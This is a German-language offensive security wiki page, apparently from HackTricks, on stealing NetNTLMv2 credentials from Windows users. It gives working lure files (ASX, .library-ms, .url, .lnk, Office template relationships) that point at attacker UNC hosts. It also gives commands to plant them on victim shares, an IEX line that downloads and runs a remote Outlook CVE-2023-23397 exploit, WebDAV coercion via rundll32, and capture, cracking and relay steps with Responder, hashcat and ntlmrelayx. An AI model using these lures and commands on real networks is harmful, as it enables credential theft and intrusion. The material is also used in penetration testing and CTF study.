# Orte zum Stehlen von NTLM-Credentials

{{#include ../../banners/hacktricks-training.md}}

**Prüfe all die großartigen Ideen unter [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) – vom Herunterladen einer Microsoft-Word-Datei aus dem Internet bis zur NTLM-leaks-Quelle: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Beschreibbare SMB-Freigabe + durch Explorer ausgelöste UNC-Lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **in eine Freigabe schreiben kannst, die Benutzer oder geplante Jobs im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deine UNC-Adresse verweisen (z. B. `\\ATTACKER\share`). Beim Anzeigen des Ordners wird **implizite SMB-Authentifizierung** ausgelöst und ein **NetNTLMv2** an deinen Listener geleakt.<sup>[[1]](#references)</sup>

1. **Lures generieren** (deckt SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/usw. ab)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Lege sie auf der beschreibbaren Freigabe ab** (in einem beliebigen Ordner, den das Opfer öffnet):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Mithören und cracken**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows kann auf mehrere Dateien gleichzeitig zugreifen; alles, was der Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), erfordert keine Klicks.

### Windows Media Player playlists (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine Windows Media Player playlist zu öffnen oder in der Vorschau anzuzeigen, die du kontrollierst, kannst du Net-NTLMv2 leaken, indem du den Eintrag auf einen UNC-Pfad verweist. WMP versucht, die referenzierten Medien über SMB abzurufen und authentifiziert sich dabei implizit.<sup>[[3]](#references)[[4]](#references)</sup>

Beispiel-Payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Ablauf zum Sammeln und Cracken:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### In ZIP eingebetteter .library-ms-NTLM leak (CVE-2025-24071/24055)

Windows Explorer verarbeitet .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Verweist die Bibliotheksdefinition auf einen Remote-UNC-Pfad (z. B. \\attacker\share), reicht es aus, die .library-ms-Datei im ZIP-Archiv aufzurufen oder zu durchsuchen, damit Explorer den UNC-Pfad auflistet und NTLM-Authentifizierungsdaten an den Angreifer sendet. Dadurch erhält man einen NetNTLMv2-Hash, der offline geknackt oder möglicherweise weitergeleitet werden kann.<sup>[[2]](#references)</sup>

Minimale .library-ms-Datei, die auf einen Angreifer-UNC-Pfad verweist

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operative Schritte
- Erstelle die Datei .library-ms mit dem obigen XML (trage deine IP/Hostname ein).
- Zippe sie (unter Windows: Senden an → ZIP-komprimierter Ordner) und stelle die ZIP-Datei dem Ziel bereit.
- Starte einen NTLM-Capture-Listener und warte, bis das Opfer die Datei .library-ms aus der ZIP-Datei öffnet.


### Outlook-Kalendererinnerung: Soundpfad (CVE-2023-23397) – Zero-Click-Net-NTLMv2-leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in Kalendereinträgen. Wenn diese Eigenschaft auf einen UNC-Pfad verweist (z. B. \\attacker\share\alert.wav), stellte Outlook eine Verbindung zur SMB-Freigabe her, sobald die Erinnerung ausgelöst wurde, und leak­te Net-NTLMv2 des Benutzers – ganz ohne Klick. Dies wurde am 14. März 2023 gepatcht, ist aber für ältere/unveränderte Systeme und die nachträgliche Untersuchung von Sicherheitsvorfällen weiterhin hochrelevant.<sup>[[5]](#references)</sup>

Schnelle Ausnutzung mit PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener-Seite:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notizen
- Das Opfer muss lediglich Outlook für Windows geöffnet haben, wenn die Erinnerung ausgelöst wird.
- Der leak liefert Net‑NTLMv2, das sich für Offline-Cracking oder Relay eignet (nicht für Pass-the-Hash).


### .LNK/.URL icon-basierter Zero-Click-NTLM-leak (CVE‑2025‑50154 – Umgehung von CVE‑2025‑24054)

Windows Explorer rendert Verknüpfungssymbole automatisch. Jüngste Untersuchungen zeigten, dass es auch nach Microsofts Patch vom April 2025 für UNC-Symbolverknüpfungen weiterhin möglich war, eine NTLM-Authentifizierung ohne Klicks auszulösen, indem das Verknüpfungsziel auf einem UNC-Pfad gehostet und das Symbol lokal gehalten wurde (der Patch-Bypass erhielt die Kennung CVE‑2025‑50154). Bereits das Anzeigen des Ordners veranlasst Explorer, Metadaten vom Remote-Ziel abzurufen und NTLM an den SMB-Server des Angreifers zu senden.<sup>[[6]](#references)</sup>

Minimales Internet-Shortcut-Payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Shortcut-Payload (.lnk) mit PowerShell programmieren:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Delivery-Ideen
- Lege die Verknüpfung in ein ZIP-Archiv und bringe das Opfer dazu, es zu öffnen.
- Platziere die Verknüpfung auf einer beschreibbaren Freigabe, die das Opfer öffnen wird.
- Kombiniere sie mit anderen Lockdateien im selben Ordner, damit Explorer eine Vorschau der Elemente anzeigt.

### No-Click-.LNK-NTLM-leak über den ExtraData-Icon-Pfad (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten beim **Anzeigen/in der Vorschau** (Rendern des Icons), nicht nur bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke die Shell dazu veranlassen, einen Icon-Pfad aufzulösen und während des **Ladevorgangs** auf das Dateisystem zuzugreifen. Ist der Pfad remote, wird ausgehendes NTLM ausgelöst.

Wichtige Auslösebedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- **DARWIN_PROPS** (`0xa0000006`) in ExtraData einfügen (schaltet die Icon-Aktualisierungsroutine frei).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode** einfügen.
- Der Loader expandiert Umgebungsvariablen in `TargetUnicode` und ruft `PathFileExistsW` für den resultierenden Pfad auf.

Wenn `TargetUnicode` zu einem UNC-Pfad aufgelöst wird (z. B. `\\attacker\share\icon.ico`), löst **bereits das Anzeigen eines Ordners** mit der Verknüpfung eine ausgehende Authentifizierung aus. Derselbe Ladepfad kann auch durch **Indizierung** und **AV-Scans** ausgelöst werden, was eine praktische No-Click-leak-Angriffsfläche schafft.<sup>[[7]](#references)</sup>

Im Projekt **LnkMeMaybe** stehen Research-Tools (Parser/Generator/UI) bereit, um diese Strukturen ohne Windows-GUI zu erstellen und zu untersuchen.<sup>[[8]](#references)</sup>


### WebDAV-Auth-Coercion / Credential-Validierung über `davclnt.dll,DavSetCookie`

Der native **WebDAV-Client** kann missbraucht werden, um die aktuelle Logon-Sitzung zur Authentifizierung bei einem beliebigen **HTTP/WebDAV**-Endpunkt zu zwingen:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Warum dies nützlich ist:
- Gegen einen **vom Angreifer kontrollierten WebDAV-Server** kann damit **NTLM über HTTP** ausgelöst werden, ohne einen eigenen Client abzulegen.
- Gegen **interne Hosts** ist dies eine unauffällige Möglichkeit zu **überprüfen, wo gestohlene Anmeldedaten akzeptiert werden**, bevor man sich lateral bewegt.<sup>[[9]](#references)</sup>
- Der Befehl ist eine gute Alternative, wenn **SMB-Egress gefiltert** wird, **HTTP/WebDAV** aber weiterhin erreichbar ist.

Hinweise zum Betrieb:
- Der Dienst **WebClient** muss auf dem Quellhost laufen.
- `rundll32.exe` lädt `davclnt.dll` und überlässt Windows die WebDAV-Authentifizierung mit den **Anmeldedaten des aktuellen Benutzers**.<sup>[[10]](#references)</sup>
- Wenn Sie auf eine Infrastruktur verweisen, die Sie kontrollieren, verwenden Sie einen NTLM-fähigen HTTP-Listener/Relay wie:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Aus Sicht der Erkennung sind wiederholte Ausführungen von `rundll32.exe davclnt.dll,DavSetCookie` gegen viele interne Systeme ein starkes Signal für **Anmeldedatenvalidierung / spray-ähnliche Vorbereitung lateraler Bewegung** und nicht für normales Benutzerverhalten.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm), um NTLM zu erzwingen

Office-Dokumente können auf eine externe Vorlage verweisen. Wenn Sie die angefügte Vorlage auf einen UNC-Pfad setzen, authentifiziert sich das Öffnen des Dokuments bei SMB.

Minimale Änderungen an DOCX-Beziehungen (innerhalb von word/):

1) Bearbeiten Sie word/settings.xml und fügen Sie den Verweis auf die angefügte Vorlage hinzu:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deinen UNC-Pfad:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Packe es wieder als .docx und liefere es aus. Starte deinen SMB-Capture-Listener und warte, bis die Datei geöffnet wird.

Ideen zum Relaying oder Missbrauchen von NTLM nach dem Capture findest du hier:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Köder über beschreibbare Freigaben + Responder-Capture → NetNTLMv2-Crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP-.library‑ms-Auth-Leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 zu DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP-NTLM-Leak → NTFS-Junction zum Webroot-RCE → FullPowers + GodPotato zu SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM-Schwachstellen: Ungepatchte Privilegieneskalationsbedrohungen in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft entschärft Outlook-EoP (CVE‑2023‑23397) und erklärt den NTLM-Leak über PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-Click, ein NTLM: Umgehung des Microsoft-Sicherheitspatches (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Eine Analyse von CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe-Tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Wenn der IT-Support anruft: Analyse einer ModeloRAT-Kampagne vom Teams-Angriff bis zur Kompromittierung der Domäne](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h-Header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows-Rundll32-WebDAV-Anfrage](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com – Interessante Orte zum Stehlen von NetNTLM-Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
